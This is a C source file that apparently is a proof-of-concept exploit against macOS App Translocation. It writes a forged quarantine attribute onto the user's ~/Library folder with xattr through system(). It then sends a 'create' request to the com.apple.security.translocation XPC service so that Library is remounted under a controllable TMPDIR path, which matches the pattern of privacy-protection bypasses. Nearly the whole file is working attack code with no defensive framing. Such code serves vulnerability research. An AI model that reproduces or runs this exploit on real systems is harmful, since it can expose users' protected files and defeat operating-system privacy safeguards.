#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>

int main(int argc, const char **argv) {


	//getenv
	char *homedir = getenv("HOME");
	char *tmpdir = getenv("TMPDIR");
	
	//create paths
    char original[MAXPATHLEN];
    char destination[MAXPATHLEN];
	snprintf(original, sizeof(original), "%s%s", homedir, "/Library");
	snprintf(destination, sizeof(destination), "%s%s%s", "/private", tmpdir, "AppTranslocation/d/d/Library");

	//add quarantine attribute to Library so translocation can occur
	char command[MAXPATHLEN];
	snprintf(command, sizeof(command), "%s%s", "xattr -w com.apple.quarantine \"0083;603abfc5;Safari;FB909FBD-7F1E-4AA1-8D93-CB706A20135C\" ", original);
	system(command);
	
	char command2[MAXPATHLEN];
	snprintf(command2, sizeof(command2), "%s%s%s", "mkdir ", tmpdir, "/AppTranslocation");
	system(command2);
	
	
	
	/* from here is just calling the translocation XPC service */
	
    uint64_t flags = 0;
    char* outPath;

    /* XPC Function keys */
    const char* kSecTranslocateXPCFuncCreate = "create";
    const char* kSecTranslocateXPCFuncCheckIn = "check-in";

    /* XPC message argument keys */
    const char* kSecTranslocateXPCMessageFunction = "function";
    const char* kSecTranslocateXPCMessageOriginalPath = "original";
    const char* kSecTranslocateXPCMessageDestinationPath = "dest";
    const char* kSecTranslocateXPCMessageOptions= "opts";
    const char* kSecTranslocateXPCMessagePid = "pid";

    /*XPC message reply keys */
    const char* kSecTranslocateXPCReplyError = "error";
    const char* kSecTranslocateXPCReplySecurePath = "result";

    xpc_connection_t service;
	xpc_object_t msg;

	msg = xpc_dictionary_create(NULL, NULL, 0);
	
    xpc_dictionary_set_string(msg, kSecTranslocateXPCMessageFunction, kSecTranslocateXPCFuncCreate);
    xpc_dictionary_set_string(msg, kSecTranslocateXPCMessageOriginalPath, original);
    xpc_dictionary_set_int64(msg, kSecTranslocateXPCMessageOptions, flags);
    xpc_dictionary_set_string(msg, kSecTranslocateXPCMessageDestinationPath, destination);


	service = xpc_connection_create_mach_service("com.apple.security.translocation", NULL, 0);
	if (service == NULL) {
		perror("xpc_connection_create_mach_service");
	}
	
    xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
        xpc_type_t type = xpc_get_type(event);
        if (type == XPC_TYPE_ERROR)
        {
            printf("SecTranslocate, client, xpc error: %s", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
        }
        else
        {
            char* description = xpc_copy_description(event);
            printf("SecTranslocate, client, xpc unexpected type: %s", description);
            
        }
    });
    

	xpc_connection_resume(service);

    xpc_object_t reply = xpc_connection_send_message_with_reply_sync(service, msg);
    xpc_release(msg);

    if(reply == NULL)
    {
        printf("SecTranslocate, TranslocatorClient, create, no reply returned");
        return -1;
    }

    xpc_type_t type = xpc_get_type(reply);
    if (type == XPC_TYPE_DICTIONARY)
    {
        uint64_t error = 0;
        error = xpc_dictionary_get_int64(reply, kSecTranslocateXPCReplyError);
        if(error != 0 )
        {
            printf("SecTranslocate, TranslocatorClient, create, error received %lld", error);
            xpc_release(reply);
            return -1;
        }
        const char * result = xpc_dictionary_get_string(reply, kSecTranslocateXPCReplySecurePath);
        if (result == NULL)
        {
            printf("SecTranslocate, TranslocatorClient, create, no result path received");
            xpc_release(reply);
            return -1;
        }
        outPath=result;
        xpc_release(reply);
    }
    else
    {
        const char* errorMsg = NULL;
        if (type == XPC_TYPE_ERROR)
        {
            errorMsg = "SecTranslocate, TranslocatorClient, create, xpc error returned: %s";
        }
        else
        {
            errorMsg = "SecTranslocate, TranslocatorClient, create, unexpected type of return object: %s";
        }
        const char *s = xpc_copy_description(reply);
        printf(errorMsg, s);
        free((char*)s);
        xpc_release(reply);
        return -1;
    }

    printf("%s\n",outPath);


}
